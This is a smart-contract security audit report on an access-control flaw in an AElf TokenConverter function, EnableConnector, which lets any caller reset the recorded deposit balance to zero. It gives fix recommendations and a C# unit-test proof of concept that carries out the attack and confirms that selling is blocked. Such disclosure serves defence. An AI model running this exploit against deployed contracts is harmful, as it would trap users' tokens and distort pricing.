# Audit Report

## Title
EnableConnector Allows Re-Enabling with Zero Deposit, Corrupting DepositBalance Accounting

## Summary
The `EnableConnector` function lacks authorization checks and re-enabling protection, allowing any external user to call it on already-enabled connectors. By crafting inputs that yield zero deposit requirements, an attacker can unconditionally overwrite `DepositBalance` to zero, erasing accumulated deposits from prior Buy operations. This causes permanent DoS of Sell operations and corrupts Bancor pricing calculations.

## Finding Description

The `EnableConnector` function contains critical security flaws that break the TokenConverter's accounting integrity: [1](#0-0) 

**Flaw 1: No Authorization Check**
Unlike `UpdateConnector` which enforces controller-only access, `EnableConnector` has no authorization check whatsoever, allowing any external user to invoke it: [2](#0-1) 

**Flaw 2: No Re-Enabling Protection**
`UpdateConnector` explicitly prevents updates to enabled connectors, but `EnableConnector` lacks this guard and can be called repeatedly on already-active connectors: [3](#0-2) 

**Flaw 3: Unconditional DepositBalance Overwrite**
The function unconditionally assigns (not adds to) the deposit balance, erasing any previously accumulated value: [4](#0-3) 

**Attack Vector:**
When `GetNeededDeposit` calculates that `amountOutOfTokenConvert = totalSupply - balance - AmountToTokenConvert <= 0`, it returns `needDeposit = 0`: [5](#0-4) 

An attacker can trigger this by supplying `AmountToTokenConvert >= totalSupply - balance`, causing the conditional deposit transfer to be skipped while still executing the unconditional DepositBalance assignment to zero. [6](#0-5) 

## Impact Explanation

**1. DepositBalance Accounting Corruption**
Buy operations accumulate base tokens in DepositBalance, which tracks the contract's reserve backing the connector: [7](#0-6) 

Resetting DepositBalance to zero creates a critical mismatch between the contract's actual token holdings and its internal accounting.

**2. Sell Operation Denial of Service**
The Sell function subtracts from DepositBalance using checked arithmetic. With DepositBalance corrupted to zero, any Sell attempt throws an overflow exception: [8](#0-7) 

The `.Sub()` method uses checked arithmetic that throws on underflow: [9](#0-8) 

This makes Sell operations permanently unavailable, trapping users' tokens.

**3. Bancor Pricing Manipulation**
`GetSelfBalance` returns DepositBalance for deposit accounts, which is used in Bancor pricing formulas: [10](#0-9) 

With corrupted DepositBalance, the Bancor formula calculates incorrect prices, enabling arbitrage exploitation and unfair trades.

**4. Irreversible State Corruption**
The UpdateConnector protection prevents fixing enabled connectors, making the corruption permanent: [3](#0-2) 

## Likelihood Explanation

**Attacker Capabilities**: Any external address can call EnableConnector without authorization or approval requirements.

**Attack Complexity**: LOW
- Step 1: Acquire sufficient resource tokens (via market purchase or existing holdings)
- Step 2: Approve TokenConverter contract for token transfer
- Step 3: Call EnableConnector with `AmountToTokenConvert >= totalSupply - balance`
- Cost: Market price of resource tokens (which are returned to attacker via the transfer)

**Feasibility Conditions**:
- Target connector is already enabled with accumulated DepositBalance > 0
- Attacker has access to sufficient resource tokens (feasible for any moderately-funded actor)
- Economic incentive exists (arbitrage profit from mispricing or competitive sabotage)

**Detection Difficulty**: The malicious transaction appears identical to legitimate EnableConnector calls. The corruption is only evident after examining state changes, making it difficult to prevent or detect in real-time.

**Probability Assessment**: HIGH for active, high-value connector pairs where the attack cost is justified by potential gains from pricing arbitrage or the strategic value of disabling competitor liquidity.

## Recommendation

Add three critical protections to `EnableConnector`:

1. **Enforce Authorization**: Add controller-only access check at function entry:
```csharp
AssertPerformedByConnectorController();
```

2. **Prevent Re-Enabling**: Add assertion to reject calls on already-enabled connectors:
```csharp
Assert(!toConnector.IsPurchaseEnabled, "Connector already enabled");
Assert(!fromConnector.IsPurchaseEnabled, "Connector already enabled");
```

3. **Use Additive Deposit Accounting**: Change DepositBalance update from assignment to addition:
```csharp
State.DepositBalance[toConnector.Symbol] = 
    State.DepositBalance[toConnector.Symbol].Add(needDeposit.NeedAmount);
```

These changes ensure EnableConnector can only be called once per connector, only by authorized controllers, and properly accumulates rather than overwrites deposit balances.

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_ReEnabling_Corrupts_DepositBalance_Test()
{
    // Setup: Initialize and create connector with initial DepositBalance
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "ATTACK";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 100_000_000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    
    // Enable connector initially - creates DepositBalance
    var initialEnable = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 99_000_000
    };
    await DefaultStub.EnableConnector.SendAsync(initialEnable);
    
    // Perform Buy to accumulate DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput
    {
        Symbol = tokenSymbol,
        Amount = 50_000,
        PayLimit = 100_000
    });
    
    var depositConnectorSymbol = "(NT)" + tokenSymbol;
    var balanceBeforeAttack = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    balanceBeforeAttack.ShouldBeGreaterThan(0); // DepositBalance accumulated from Buy
    
    // ATTACK: Re-enable with AmountToTokenConvert >= totalSupply - balance
    // This yields needDeposit = 0 and overwrites DepositBalance to 0
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = tokenSymbol });
    var contractBalance = await GetBalanceAsync(tokenSymbol, TokenConverterContractAddress);
    
    var attackEnable = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = tokenInfo.TotalSupply - contractBalance // Makes needDeposit = 0
    };
    
    await DefaultStub.EnableConnector.SendAsync(attackEnable); // No authorization check!
    
    var balanceAfterAttack = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    balanceAfterAttack.ShouldBe(0); // DepositBalance corrupted to 0!
    
    // IMPACT: Sell operations now fail with overflow
    var sellAttempt = await DefaultStub.Sell.SendWithExceptionAsync(new SellInput
    {
        Symbol = tokenSymbol,
        Amount = 10_000,
        ReceiveLimit = 0
    });
    sellAttempt.TransactionResult.Error.ShouldContain("Overflow"); // DoS confirmed
}
```

## Notes

This vulnerability demonstrates a critical failure in access control and state management. The combination of missing authorization, lack of re-enabling protection, and unconditional state overwrite creates an exploitable attack vector that corrupts the TokenConverter's accounting invariants. The impact is severe as it causes permanent DoS of Sell operations while enabling pricing manipulation through Bancor formula corruption. The attack is feasible for any external user with sufficient tokens and has low complexity, making exploitation highly likely on production deployments.

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-64)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
        Assert(!string.IsNullOrEmpty(input.Symbol), "input symbol can not be empty'");
        var targetConnector = State.Connectors[input.Symbol];
        Assert(targetConnector != null, "Can not find target connector.");
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-84)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-97)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
```
